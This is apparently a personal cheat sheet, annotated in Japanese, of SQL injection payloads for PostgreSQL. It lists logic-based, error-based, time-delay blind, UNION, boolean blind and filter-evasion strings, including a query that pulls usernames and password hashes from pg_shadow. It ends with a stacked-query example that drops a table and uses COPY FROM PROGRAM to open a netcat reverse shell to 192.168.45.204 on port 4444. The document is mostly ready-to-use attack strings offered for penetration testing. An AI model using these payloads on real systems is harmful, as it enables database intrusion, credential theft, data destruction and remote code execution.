```bash
# 🔸【基本チェック（ロジックベース）】
' OR 1=1-- 
' OR 'a'='a'-- 
') OR ('1'='1'-- 
1' OR '1'='1'--  

---

# 🔸【エラーを誘発させるペイロード（エラーベース）】
' ORDER BY 100-- 
' AND (SELECT 1 FROM generate_series(1,9999999999))-- 
' AND (SELECT 1/0)-- 
' || (SELECT 1 FROM pg_user LIMIT 1)--  

---

# 🔸【時間遅延型ブラインドSQLi】
' OR pg_sleep(5)-- 
' AND 1=(SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)-- 
1'; SELECT pg_sleep(5);-- 
' ; SELECT pg_sleep(5);--  

---

# 🔸【UNIONベースのテスト】
' UNION SELECT NULL-- 
' UNION SELECT NULL,NULL-- 
' UNION SELECT 1,version()-- 
' UNION SELECT table_schema, table_name FROM information_schema.tables--  

---

# 🔸【Booleanベース ブラインドSQLi】
' AND 1=1-- 
' AND 1=2-- 
' AND ASCII(SUBSTRING((SELECT current_user),1,1))=112-- 
' AND EXISTS(SELECT 1 FROM pg_user)-- 

---

# 🔸【WAFやフィルタ回避】
'/**/OR/**/1=1-- 
' OR+1=1-- 
' OR 1=1 /*comment*/-- 
' OR 1=1--+ 

---

# 🔸【PostgreSQL特有の内部情報取得】
' AND (SELECT COUNT(*) FROM pg_user)>0-- 
' AND EXISTS(SELECT datname FROM pg_database WHERE datistemplate = false)-- 
' UNION SELECT usename, passwd FROM pg_shadow-- 
```
> ⚠ pg_shadow` などのシステムテーブルは、PostgreSQLバージョンや設定によりアクセス制限があります。

---

## ✅ 注意点

- PostgreSQLでは `pg_sleep(seconds)` が**時間遅延のための関数**です。
    
- セミコロン（`;`）による**複文実行**は、Webアプリケーション側でブロックされている場合があります。
    
- PostgreSQLは `||` を文字列結合として使えるので、`'abc'||'def'` → `'abcdef'`

# 例
```bash
';DROP TABLE IF EXISTS commandexec;CREATE TABLE commandexec(data text);COPY commandexec FROM PROGRAM '/usr/bin/nc -e /bin/sh 192.168.45.204 4444';-- 
```
